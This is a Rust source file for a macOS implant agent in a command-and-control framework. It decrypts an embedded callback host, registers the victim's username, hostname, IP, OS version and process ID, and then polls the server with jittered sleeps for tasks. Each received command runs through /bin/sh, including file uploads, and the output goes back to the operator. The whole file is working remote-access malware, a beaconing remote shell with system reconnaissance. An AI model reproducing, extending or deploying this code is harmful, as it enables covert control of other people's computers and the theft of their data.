use link_common::{
    build_client, decrypt_config, derive_key, dispatch::dispatch_common, get_jitter_percent,
    get_sleep_seconds, should_exit, sleep, sleep_with_jitter, CallbackRequest, RegisterRequest,
    TaskResponse,
};
use std::env;
use std::process::Command;

const CALLBACK: &str = env!("CALLBACK");

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USER").unwrap_or_else(|_| "unknown".into())
}

/// Uses `scutil --get ComputerName` which is the canonical macOS hostname.
fn hostname() -> String {
    Command::new("scutil")
        .args(["--get", "ComputerName"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| {
            std::fs::read_to_string("/etc/hostname")
                .unwrap_or_else(|_| "unknown".into())
                .trim()
                .to_string()
        })
}

fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

/// Returns the macOS product name + version, e.g. "macOS 14.4.1".
fn platform_info() -> String {
    let name = Command::new("sw_vers")
        .arg("-productName")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "macOS".into());

    let version = Command::new("sw_vers")
        .arg("-productVersion")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "unknown".into());

    format!("{} {}", name, version)
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    let encryption_key = derive_key("linky-secret-key", "callback-salt");
    let decrypted_callback =
        decrypt_config(CALLBACK, &encryption_key).unwrap_or_else(|| CALLBACK.to_string());

    let client = build_client();
    let base = format!("https://{}", decrypted_callback);

    // Stage 1: establish session cookie
    loop {
        if client.get(format!("{}/js", base)).send().is_ok() {
            break;
        }
        if should_exit() {
            return;
        }
        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }

    // Stage 2: register
    let reg = RegisterRequest {
        link_username: username(),
        link_hostname: hostname(),
        internal_ip: local_ip(),
        external_ip: String::new(),
        platform: platform_info(),
        pid: std::process::id(),
    };

    let mut x_req_id = loop {
        if let Ok(r) = client
            .post(format!("{}/static/register", base))
            .json(&reg)
            .send()
        {
            if let Ok(t) = r.json::<TaskResponse>() {
                break t.x_request_id;
            }
        }
        sleep(5);
    };

    // Stage 3: polling loop
    let mut prev_output = String::new();
    let mut prev_task_id = String::new();

    loop {
        if should_exit() {
            break;
        }

        let cb = CallbackRequest {
            q: &prev_output,
            tasking: &prev_task_id,
        };

        match client
            .post(format!("{}/static/get", base))
            .header("x-request-id", &x_req_id)
            .json(&cb)
            .send()
            .and_then(|r| r.json::<TaskResponse>())
        {
            Ok(task) => {
                x_req_id = task.x_request_id.clone();
                if task.q.is_empty() {
                    prev_output = String::new();
                    prev_task_id = String::new();
                } else if task.q == "exit" {
                    break;
                } else {
                    let effective_cmd = if task.q.starts_with("upload ") {
                        if let (Some(content), Some(path)) = (&task.upload, &task.upload_path) {
                            format!("upload {} {}", content, path)
                        } else {
                            task.q.clone()
                        }
                    } else {
                        task.q.clone()
                    };
                    prev_output = dispatch(&effective_cmd);
                    prev_task_id = task.tasking.clone();
                }
            }
            Err(_) => {
                prev_output = String::new();
                prev_task_id = String::new();
            }
        }

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(raw: &str) -> String {
    if let Some(output) = dispatch_common(raw) {
        return output;
    }
    let (cmd, args) = link_common::split_first(raw);
    match cmd {
        "whoami" => format!("{}@{}", username(), hostname()),
        "shell" => shell_exec(args),
        _ => shell_exec(raw),
    }
}

fn shell_exec(cmd: &str) -> String {
    match Command::new("/bin/sh").arg("-c").arg(cmd).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}
